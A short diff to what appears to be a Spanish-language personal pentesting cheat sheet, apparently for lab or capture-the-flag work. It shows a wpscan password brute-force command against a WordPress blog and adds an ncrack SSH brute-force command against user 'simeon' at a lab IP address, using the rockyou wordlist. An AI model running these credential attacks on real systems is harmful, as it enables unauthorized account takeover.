@@ -60,3 +60,6 @@ wpscan --url IP/blog --usernames admin --passwords rockyou.txt --max-threads 50
 
 # diccionarios
 awk 'length($0) == 10' rockyou.txt > rock-10L.txt # achicar el diccionario a 10 caracteres de largo
+
+# crackers
+ncrack -p 22 -u simeon -P wl.txt 10.10.170.245
